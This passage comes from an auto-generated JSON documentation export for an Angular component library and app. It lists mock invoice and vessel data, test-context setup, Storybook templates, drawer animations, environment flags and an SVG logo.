225951335,\r\n    voyageNo: 15473,\r\n    vesselName: 'Olympic Saxifrage',\r\n    allocated: 429650,\r\n    total: 413380\r\n  }, {\r\n    invoiceNo: 206579573,\r\n    voyageNo: 17600,\r\n    vesselName: 'False Sun-rose',\r\n    allocated: 464983,\r\n    total: 474611\r\n  }, {\r\n    invoiceNo: 243806520,\r\n    voyageNo: 15148,\r\n    vesselName: 'Bracted Lousewort',\r\n    allocated: 486907,\r\n    total: 419416\r\n  }, {\r\n    invoiceNo: 248037555,\r\n    voyageNo: 16554,\r\n    vesselName: 'Beach Strawberry',\r\n    allocated: 446762,\r\n    total: 543982\r\n  }, {\r\n    invoiceNo: 233807782,\r\n    voyageNo: 18251,\r\n    vesselName: 'Western Bog Yellowcress',\r\n    allocated: 485749,\r\n    total: 206612\r\n  }, {\r\n    invoiceNo: 231399318,\r\n    voyageNo: 18647,\r\n    vesselName: 'Nevada Pea',\r\n    allocated: 416624,\r\n    total: 73797\r\n  }, {\r\n    invoiceNo: 210265421,\r\n    voyageNo: 17334,\r\n    vesselName: 'Silver Bird\\'s-foot Trefoil',\r\n    allocated: 493556,\r\n    total: 485404\r\n  }, {\r\n    invoiceNo: 270110020,\r\n    voyageNo: 15750,\r\n    vesselName: 'Dotted Lancepod',\r\n    allocated: 439009,\r\n    total: 85163\r\n  }, {\r\n    invoiceNo: 203365491,\r\n    voyageNo: 15574,\r\n    vesselName: 'Arizona Whitefeather',\r\n    allocated: 424981,\r\n    total: 72976\r\n  }, {\r\n    invoiceNo: 258026382,\r\n    voyageNo: 17991,\r\n    vesselName: 'Rough Blackfoot',\r\n    allocated: 412805,\r\n    total: 525915\r\n  }, {\r\n    invoiceNo: 216800989,\r\n    voyageNo: 18938,\r\n    vesselName: 'Narrowleaf Wirelettuce',\r\n    allocated: 437679,\r\n    total: 384426\r\n  }, {\r\n    invoiceNo: 224161270,\r\n    voyageNo: 15475,\r\n    vesselName: 'Utah Sweetvetch',\r\n    allocated: 414735,\r\n    total: 398700\r\n  }, {\r\n    invoiceNo: 224587536,\r\n    voyageNo: 16133,\r\n    vesselName: 'Palau Horsfieldia',\r\n    allocated: 409836,\r\n    total: 55599\r\n  }, {\r\n    invoiceNo: 200019644,\r\n    voyageNo: 16430,\r\n    vesselName: 'Cracked Lichen',\r\n    allocated: 491135,\r\n    total: 400179\r\n  }, {\r\n    invoiceNo: 212973644,\r\n    voyageNo: 16527,\r\n    vesselName: 'California Valerian',\r\n    allocated: 465742,\r\n    total: 428281\r\n  }, {\r\n    invoiceNo: 236726871,\r\n    voyageNo: 15145,\r\n    vesselName: 'Spear Saltbush',\r\n    allocated: 420067,\r\n    total: 236753\r\n  }, {\r\n    invoiceNo: 262498296,\r\n    voyageNo: 16350,\r\n    vesselName: 'Rose Globemallow',\r\n    allocated: 472387,\r\n    total: 270655\r\n  }, {\r\n    invoiceNo: 237959767,\r\n    voyageNo: 18739,\r\n    vesselName: 'Cithara Buckwheat',\r\n    allocated: 447466,\r\n    total: 358262\r\n  }, {\r\n    invoiceNo: 200461954,\r\n    voyageNo: 18921,\r\n    vesselName: 'Rough Potato',\r\n    allocated: 425594,\r\n    total: 459497\r\n  }, {\r\n    invoiceNo: 266033549,\r\n    voyageNo: 16150,\r\n    vesselName: 'Distictis',\r\n    allocated: 447636,\r\n    total: 286350\r\n  }, {\r\n    invoiceNo: 289893009,\r\n    voyageNo: 18219,\r\n    vesselName: 'Piedmont False Pimpernel',\r\n    allocated: 474098,\r\n    total: 163688\r\n  }, {\r\n    invoiceNo: 241320630,\r\n    voyageNo: 15558,\r\n    vesselName: 'Southern Mexican Sage',\r\n    allocated: 431537,\r\n    total: 419734\r\n  }, {\r\n    invoiceNo: 211404482,\r\n    voyageNo: 18502,\r\n    vesselName: 'Bearded Sprangletop',\r\n    allocated: 458939,\r\n    total: 89714\r\n  }, {\r\n    invoiceNo: 247917426,\r\n    voyageNo: 18238,\r\n    vesselName: 'Small-flowered Calycadenia',\r\n    allocated: 406198,\r\n    total: 351785\r\n  }, {\r\n    invoiceNo: 234633032,\r\n    voyageNo: 17269,\r\n    vesselName: 'Pritchardia',\r\n    allocated: 442188,\r\n    total: 414638\r\n  }, {\r\n    invoiceNo: 216477974,\r\n    voyageNo: 15454,\r\n    vesselName: 'Thread Lichen',\r\n    allocated: 474232,\r\n    total: 537142\r\n  }, {\r\n    invoiceNo: 201667786,\r\n    voyageNo: 15130,\r\n    vesselName: 'Margined Stickseed',\r\n    allocated: 493253,\r\n    total: 364145\r\n  }, {\r\n    invoiceNo: 271891491,\r\n    voyageNo: 15468,\r\n    vesselName: 'Eggleaf Milkwort',\r\n    allocated: 457747,\r\n    total: 316780\r\n  }, {\r\n    invoiceNo: 223744528,\r\n    voyageNo: 16074,\r\n    vesselName: 'Hall\\'s Mule-ears',\r\n    allocated: 439241,\r\n    total: 301239\r\n  }, {\r\n    invoiceNo: 202936481,\r\n    voyageNo: 18868,\r\n    vesselName: 'Rinodina Lichen',\r\n    allocated: 488291,\r\n    total: 504547\r\n  }, {\r\n    invoiceNo: 284610720,\r\n    voyageNo: 17077,\r\n    vesselName: 'Saber Bogmat',\r\n    allocated: 417817,\r\n    total: 246511\r\n  }, {\r\n    invoiceNo: 286535852,\r\n    voyageNo: 15935,\r\n    vesselName: 'Brodiaea',\r\n    allocated: 479989,\r\n    total: 276206\r\n  }, {\r\n    invoiceNo: 206000446,\r\n    voyageNo: 17528,\r\n    vesselName: 'Utah Serviceberry',\r\n    allocated: 454837,\r\n    total: 399887\r\n  }, {\r\n    invoiceNo: 283036494,\r\n    voyageNo: 16899,\r\n    vesselName: 'Lehua Makanoe',\r\n    allocated: 452547,\r\n    total: 96023\r\n  }, {\r\n    invoiceNo: 270371913,\r\n    voyageNo: 16886,\r\n    vesselName: 'Rim Lichen',\r\n    allocated: 439082,\r\n    total: 269557\r\n  }, {\r\n    invoiceNo: 273513209,\r\n    voyageNo: 15570,\r\n    vesselName: 'Andrews\\' Rhizomnium Moss',\r\n    allocated: 471494,\r\n    total: 131750\r\n  }, {\r\n    invoiceNo: 215244773,\r\n    voyageNo: 17618,\r\n    vesselName: 'Lesser Pond Sedge',\r\n    allocated: 472422,\r\n    total: 505921\r\n  }, {\r\n    invoiceNo: 264815411,\r\n    voyageNo: 17008,\r\n    vesselName: 'Browne\\'s Savory',\r\n    allocated: 464834,\r\n    total: 420180\r\n  }, {\r\n    invoiceNo: 260793904,\r\n    voyageNo: 18868,\r\n    vesselName: 'Bastard Copperleaf',\r\n    allocated: 403983,\r\n    total: 190831\r\n  }, {\r\n    invoiceNo: 228919503,\r\n    voyageNo: 16736,\r\n    vesselName: 'Himalayan Cypress',\r\n    allocated: 418664,\r\n    total: 450233\r\n  }, {\r\n    invoiceNo: 225534860,\r\n    voyageNo: 18374,\r\n    vesselName: 'Fiddleleaf Hawksbeard',\r\n    allocated: 495477,\r\n    total: 528500\r\n  }, {\r\n    invoiceNo: 205039289,\r\n    voyageNo: 15221,\r\n    vesselName: 'Maui Cyanea',\r\n    allocated: 434081,\r\n    total: 79021\r\n  }, {\r\n    invoiceNo: 219730920,\r\n    voyageNo: 18931,\r\n    vesselName: 'Garden Sorrel',\r\n    allocated: 442584,\r\n    total: 193166\r\n  }, {\r\n    invoiceNo: 229994865,\r\n    voyageNo: 16404,\r\n    vesselName: 'Waialeale Dubautia',\r\n    allocated: 414377,\r\n    total: 195495\r\n  }, {\r\n    invoiceNo: 289807557,\r\n    voyageNo: 16151,\r\n    vesselName: 'Onetooth Woodfern',\r\n    allocated: 415673,\r\n    total: 202974\r\n  }, {\r\n    invoiceNo: 289750833,\r\n    voyageNo: 15827,\r\n    vesselName: 'Greenland Orange Lichen',\r\n    allocated: 416432,\r\n    total: 146021\r\n  }, {\r\n    invoiceNo: 243948439,\r\n    voyageNo: 18154,\r\n    vesselName: 'Leafy Reedgrass',\r\n    allocated: 441439,\r\n    total: 248631\r\n  }, {\r\n    invoiceNo: 266718010,\r\n    voyageNo: 15322,\r\n    vesselName: 'Largeleaf Marshpennywort',\r\n    allocated: 436736,\r\n    total: 256997\r\n  }, {\r\n    invoiceNo: 285338933,\r\n    voyageNo: 18884,\r\n    vesselName: 'Musk Okra',\r\n    allocated: 414918,\r\n    total: 475276\r\n  }, {\r\n    invoiceNo: 284544908,\r\n    voyageNo: 16825,\r\n    vesselName: 'Stegonia Moss',\r\n    allocated: 486396,\r\n    total: 210718\r\n  }, {\r\n    invoiceNo: 200951860,\r\n    voyageNo: 15681,\r\n    vesselName: 'Black Rock Townsend Daisy',\r\n    allocated: 437133,\r\n    total: 358340\r\n  }, {\r\n    invoiceNo: 248838992,\r\n    voyageNo: 18254,\r\n    vesselName: 'Kern Canyon Clarkia',\r\n    allocated: 414245,\r\n    total: 164454\r\n  }, {\r\n    invoiceNo: 274109340,\r\n    voyageNo: 18252,\r\n    vesselName: 'Squarrose Knapweed',\r\n    allocated: 408814,\r\n    total: 159690\r\n  }, {\r\n    invoiceNo: 219721177,\r\n    voyageNo: 16331,\r\n    vesselName: 'Lake County Dwarf-flax',\r\n    allocated: 496150,\r\n    total: 404922\r\n  }, {\r\n    invoiceNo: 272212685,\r\n    voyageNo: 15395,\r\n    vesselName: 'Ferngrass',\r\n    allocated: 432853,\r\n    total: 191127\r\n  }, {\r\n    invoiceNo: 243182762,\r\n    voyageNo: 18321,\r\n    vesselName: 'Marsh Grass',\r\n    allocated: 462472,\r\n    total: 452940\r\n  }, {\r\n    invoiceNo: 277839539,\r\n    voyageNo: 17421,\r\n    vesselName: 'Prairie Straw Sedge',\r\n    allocated: 406837,\r\n    total: 271284\r\n  }, {\r\n    invoiceNo: 207952597,\r\n    voyageNo: 17197,\r\n    vesselName: 'Doublehorn Calicoflower',\r\n    allocated: 477735,\r\n    total: 400959\r\n  }, {\r\n    invoiceNo: 260636315,\r\n    voyageNo: 15453,\r\n    vesselName: 'Palmer\\'s Goldenrod',\r\n    allocated: 450419,\r\n    total: 309897\r\n  }, {\r\n    invoiceNo: 256449906,\r\n    voyageNo: 15189,\r\n    vesselName: 'Oregon Checkerbloom',\r\n    allocated: 435139,\r\n    total: 139814\r\n  }, {\r\n    invoiceNo: 230023430,\r\n    voyageNo: 15665,\r\n    vesselName: 'Duckweed',\r\n    allocated: 449282,\r\n    total: 209512\r\n  }, {\r\n    invoiceNo: 226217229,\r\n    voyageNo: 18462,\r\n    vesselName: 'Disc Lichen',\r\n    allocated: 471214,\r\n    total: 58962\r\n  }, {\r\n    invoiceNo: 239201753,\r\n    voyageNo: 18676,\r\n    vesselName: 'Antifever Fontinalis Moss',\r\n    allocated: 456585,\r\n    total: 146024\r\n  }, {\r\n    invoiceNo: 235303844,\r\n    voyageNo: 16223,\r\n    vesselName: 'Miracle Fruit',\r\n    allocated: 467877,\r\n    total: 150931\r\n  }, {\r\n    invoiceNo: 217943418,\r\n    voyageNo: 15418,\r\n    vesselName: 'Little Gumweed',\r\n    allocated: 494402,\r\n    total: 355363\r\n  }, {\r\n    invoiceNo: 289788898,\r\n    voyageNo: 15038,\r\n    vesselName: 'Parish\\'s Oxytheca',\r\n    allocated: 464853,\r\n    total: 472823\r\n  }, {\r\n    invoiceNo: 280499130,\r\n    voyageNo: 18914,\r\n    vesselName: 'Jelly Lichen',\r\n    allocated: 486477,\r\n    total: 522679\r\n  }, {\r\n    invoiceNo: 223812339,\r\n    voyageNo: 18298,\r\n    vesselName: 'Evermann\\'s Fleabane',\r\n    allocated: 453418,\r\n    total: 50034\r\n  }, {\r\n    invoiceNo: 226331833,\r\n    voyageNo: 17046,\r\n    vesselName: 'Munj Sweetcane',\r\n    allocated: 442239,\r\n    total: 447072\r\n  }, {\r\n    invoiceNo: 226842057,\r\n    voyageNo: 16491,\r\n    vesselName: 'Trichostomum Moss',\r\n    allocated: 450732,\r\n    total: 471203\r\n  }, {\r\n    invoiceNo: 218377093,\r\n    voyageNo: 18157,\r\n    vesselName: 'Brown Stringybark',\r\n    allocated: 441668,\r\n    total: 464837\r\n  }, {\r\n    invoiceNo: 282690677,\r\n    voyageNo: 16864,\r\n    vesselName: 'Whorled Milkwort',\r\n    allocated: 424456,\r\n    total: 241177\r\n  } ]"
            }
          ],
          "libs/core/src/test.ts": [
            {
              "name": "context",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/core/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
              "name": "require",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/core/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "any"
            }
          ],
          "libs/common/src/test.ts": [
            {
              "name": "context",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
              "name": "require",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "any"
            }
          ],
          "libs/datatable/src/test.ts": [
            {
              "name": "context",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
              "name": "require",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "any"
            }
          ],
          "libs/drawer/src/test.ts": [
            {
              "name": "context",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
              "name": "require",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "any"
            }
          ],
          "libs/form/src/test.ts": [
            {
              "name": "context",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
              "name": "require",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "any"
            }
          ],
          "libs/error-handler/src/test.ts": [
            {
              "name": "context",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/error-handler/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
              "name": "require",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/error-handler/src/test.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "any"
            }
          ],
          "libs/form/src/lib/number-input/value-unit-input.stories.ts": [
            {
              "name": "control",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new FormControl({ value: 32.123, unit: 'C' }, Validators.required)"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<>",
              "defaultValue": "(args) => {\r\n  return {\r\n    component: NumberUnitInputComponent,\r\n    props: {\r\n      ...args,\r\n      control,\r\n      change: action('Value changed'),\r\n    },\r\n    template: `\r\n<mat-card class=\"sto-form\" style=\"width: 600px\">\r\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\r\n    <mat-form-field stoFormField floatLabel=\"always\">\r\n      <mat-label>{{label}}</mat-label>\r\n      <sto-number-unit-input (ngModelChange)=\"change($event)\"\r\n      [fractionSize]=\"fractionSize\"\r\n      [list]=\"units\"\r\n      [readonly]=\"readonly\"\r\n      [formControl]=\"control\"\r\n      [unitPlaceholder]=\"unitPlaceholder\"\r\n      [unitClearText]=\"unitClearText\"\r\n      [unitOptional]=\"unitOptional\"\r\n      [placeholder]=\"placeholder\">\r\n      </sto-number-unit-input>\r\n    </mat-form-field><br>\r\n    {{control.value | json}}\r\n  </mat-card>`\r\n  };\r\n}"
            },
            {
              "name": "Usage",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            }
          ],
          "libs/error-handler/src/lib/error-handler/token.ts": [
            {
              "name": "CUSTOM_ERROR_HANDLER",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/error-handler/src/lib/error-handler/token.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new InjectionToken<ErrorHandler>('sto.custom-error-handler')"
            },
            {
              "name": "ERROR_LOGGER",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/error-handler/src/lib/error-handler/token.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new InjectionToken<ErrorLogger>('sto.error-logger')"
            }
          ],
          "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts": [
            {
              "name": "dialogConfig",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new MatDialogConfig()"
            }
          ],
          "libs/drawer/src/lib/animation.ts": [
            {
              "name": "drawerAnimations",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/animation.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  drawerOpenAnimation,\r\n  overlayAnimation\r\n]"
            },
            {
              "name": "drawerOpenAnimation",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/animation.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "trigger('drawerAnimations', [\r\n  state('open-left', style({ transform: 'translateX(0)', opacity: 1 })),\r\n  state('open-right', style({ transform: 'translateX(0)', opacity: 1 })),\r\n  state('openImmediate', style({ transform: 'translateX(0)', opacity: 1 })),\r\n  state('closedImmediate-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\r\n  state('closedImmediate-right', style({ transform: 'translateX(100%)', opacity: 0 })),\r\n  state('closed-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\r\n  state('closed-right', style({ transform: 'translateX(100%)', opacity: 0 })),\r\n  transition('* => closed-left', [\r\n    group([\r\n      animate('400ms ease-in-out', style({ transform: 'translateX(-100%)' })),\r\n      animate('1ms 400ms ease', style({ opacity: 0 }))\r\n    ])\r\n  ]),\r\n  transition('* => closed-right', [\r\n    group([\r\n      animate('400ms ease-in-out', style({ transform: 'translateX(100%)' })),\r\n      animate('1ms 400ms ease', style({ opacity: 0 }))\r\n    ])\r\n  ]),\r\n  transition('* => open-left', [\r\n    style({ transform: 'translateX(-100%)', opacity: 1 }),\r\n    animate('400ms ease-in-out')\r\n  ]),\r\n  transition('* => open-right', [\r\n    style({ transform: 'translateX(100%)', opacity: 1 }),\r\n    animate('400ms ease-in-out')\r\n  ]),\r\n])"
            },
            {
              "name": "overlayAnimation",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/animation.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "trigger('overlay', [\r\n  transition(':enter', [\r\n    style({ opacity: 0 }),\r\n    animate('400ms', style({ opacity: 0.08 })),\r\n  ]),\r\n  transition(':leave', [\r\n    animate('400ms', style({ opacity: 0 }))\r\n  ])\r\n])"
            }
          ],
          "apps/oilmod-web/src/environments/environment.prod.ts": [
            {
              "name": "environment",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "apps/oilmod-web/src/environments/environment.prod.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "object",
              "defaultValue": "{\r\n  production: true,\r\n}"
            }
          ],
          "apps/oilmod-web/src/environments/environment.ts": [
            {
              "name": "environment",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "apps/oilmod-web/src/environments/environment.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "object",
              "defaultValue": "{\r\n  production: false,\r\n}"
            }
          ],
          "libs/common/src/lib/sto-filter/filter-panel.stories.ts": [
            {
              "name": "FilterPanel",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<>",
              "defaultValue": "(args: StoFilterPanelComponent) => {\r\n  return {\r\n    component: StoFilterPanelComponent,\r\n    props: args,\r\n    template: `\r\n      <sto-filter-panel class=\"sto-form\"\r\n                        [expandable]=\"expandable\"\r\n                        [expanded]=\"expanded\"\r\n                        (toggled)=\"toggled()\">\r\n          <sto-filter-title>{{ title }}</sto-filter-title>\r\n          <sto-filter-table-actions>\r\n              <button mat-icon-button>\r\n                  <mat-icon>add</mat-icon>\r\n              </button>\r\n          </sto-filter-table-actions>\r\n          <div class=\"sto-form\"\r\n               stoGrid>\r\n              <mat-form-field floatLabel=\"always\"\r\n              stoFormField\r\n                              stoGridColumn>\r\n                  <mat-label>Field 1</mat-label>\r\n                  <input matInput>\r\n              </mat-form-field>\r\n              <mat-form-field floatLabel=\"always\"\r\n              stoFormField\r\n                              stoGridColumn>\r\n                  <mat-label>Field 2 (multi)</mat-label>\r\n                  <mat-select [multiple]=\"true\">\r\n                      <mat-option [value]=\"1\">{{1}}</mat-option>\r\n                      <mat-option [value]=\"2\">{{2}}</mat-option>\r\n                      <mat-option [value]=\"3\">{{3}}</mat-option>\r\n                      <mat-option [value]=\"4\">{{4}}</mat-option>\r\n                  </mat-select>\r\n              </mat-form-field>\r\n              <div stoGridColumn\r\n                   [stoGridColumnDouble]=\"true\"\r\n                   stoGridSpacer></div>\r\n          </div>\r\n      </sto-filter-panel>`\r\n  };\r\n}"
            }
          ],
          "apps/oilmod-web-e2e/src/support/app.po.ts": [
            {
              "name": "getGreeting",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "apps/oilmod-web-e2e/src/support/app.po.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "() => cy.get('h1')"
            }
          ],
          "libs/common/src/lib/theme/svg-icons.ts": [
            {
              "name": "iconMap",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/theme/svg-icons.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new Map([\r\n  [ 'equinor', `<svg width=\"26\" height=\"30\" viewBox=\"0 0 26 30\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\r\n<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M3.20802 6.37778L3.20825 14.4349C3.20802 14.6738 3.32778 14.8944 3.53463 15.0135L10.5162 19.0356C10.8124 19.2063 11.1901 18.9925 11.1903 18.6506V10.5937C11.1905 10.3548 11.0632 10.1342 10.8561 10.0149L3.87479 5.99297C3.5784 5.82233 3.20847 6.03607 3.20802 6.37778ZM24.7118 0.0862991L14.6605 5.87699C14.3628 6.04851 14.1793 6.36601 14.1797 6.70972V18.3095C14.1802 18.8019 14.7239 19.1094 15.1502 18.8637L25.2017 13.0734C25.4994 12.9017 25.6716 12.5842 25.6711 12.2405L25.6714 0.640639C25.6709 0.148287 25.1383 -0.15921 24.7118 0.0862991ZM10.9237 24.7574L8.13043 26.3669C8.04778 26.4147 7.99668 26.5029 7.99668 26.5984L7.99646 29.8218C7.99646 29.9589 8.14798 30.0442 8.2664 29.976L11.0597 28.3668C11.1425 28.3192 11.1905 28.2308 11.1903 28.1355V24.9116C11.1903 24.775 11.0421 24.6895 10.9237 24.7574ZM9.29577 21.7831L5.11256 19.3625C4.98858 19.2909 4.83572 19.2909 4.71174 19.3625L0.528527 21.7831C0.351005 21.8858 0.351005 22.1419 0.528527 22.2448L4.71174 24.665C4.83572 24.737 4.98858 24.737 5.11256 24.665L9.29577 22.2448C9.47329 22.1419 9.47329 21.8858 9.29577 21.7831ZM16.0303 22.2195L17.889 23.2948C17.999 23.3586 18.1348 23.3586 18.245 23.2948L20.1035 22.2195C20.2613 22.1279 20.2613 21.9002 20.1035 21.8089L18.245 20.7335C18.1348 20.6698 17.999 20.6698 17.889 20.7335L16.0303 21.8089C15.8725 21.9002 15.8725 22.1279 16.0303 22.2195ZM14.5352 24.8077L16.3958 25.8794C16.506 25.943 16.574 26.0607 16.574 26.1881L16.5717 28.3352C16.5715 28.5174 16.3742 28.6314 16.2162 28.5405L14.3557 27.4687C14.2455 27.4052 14.18 27.287 14.18 27.1601L14.1797 25.0129C14.1797 24.831 14.3773 24.7166 14.5352 24.8077Z\" fill=\"#EB0037\"/>\r\n</svg>` ]\r\n])"
            }
          ],
          "libs/form/src/lib/sto-select-filter/item-list.ts": [
            {
              "name": "items",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-select-filter/item-list.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\r\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\r\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\r\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\r\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\r\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\r\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\r\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\r\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\r\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\r\n]"
            }
          ],
          "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts": [
            {
              "name": "MultiSelect",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<any>",
              "defaultValue": "(args) => ( {\r\n  props: { ...args }, template: `\r\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\r\n  <mat-form-field class=\"sto-form__field\"\r\n                  floatLabel=\"always\" >\r\n    <mat-label>Multiselect with filter</mat-label>\r\n    <mat-select [multiple]=\"true\"\r\n                (selectionChange)=\"valueChange($event)\"\r\n                [value]=\"selected\">\r\n      <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\r\n                         [selected]=\"select?.length\"\r\n                         [isFilter]=\"true\"\r\n                         [focusIfNoValue]=\"focusIfNoValue\"\r\n                         [isMulti]=\"true\"\r\n                         (valueChanges)=\"filteredItems = filter($event, allItems)\"\r\n                         (selectAll)=\"selected = $event ? filteredItems :[]; selectAll($event)\"></sto-select-filter>\r\n      <mat-option *ngFor=\"let opt of filteredItems\"\r\n                  [value]=\"opt\">{{opt.name}}</mat-option>\r\n    </mat-select>\r\n  </mat-form-field>\r\n</mat-card>`\r\n} )"
            },
            {
              "name": "SingleSelect",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<Record<string, >>",
              "defaultValue": "(args) => ( {\r\n  props: { ...args },\r\n  template: `\r\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\r\n    <mat-form-field  class=\"sto-form__field\" floatLabel=\"always\">\r\n    <mat-label>Select with filter</mat-label>\r\n      <mat-select [multiple]=\"false\" [value]=\"selected\">\r\n        <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\r\n                           [isFilter]=\"isFilter\"\r\n                           [focusIfNoValue]=\"focusIfNoValue\"\r\n                           [isMulti]=\"false\"\r\n                           (valueChanges)=\"filteredItems = filter($event, allItems)\"></sto-select-filter>\r\n        <mat-option *ngFor=\"let opt of filteredItems\"\r\n                    [value]=\"opt\">{{opt.name}}</mat-option>\r\n      </mat-select>\r\n    </mat-form-field>\r\n</mat-card>`\r\n} )"
            }
          ],
            "libs/drawer/src/lib/sto-navigation/navigation.ts": [
              {
                "name": "navigation",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "object",
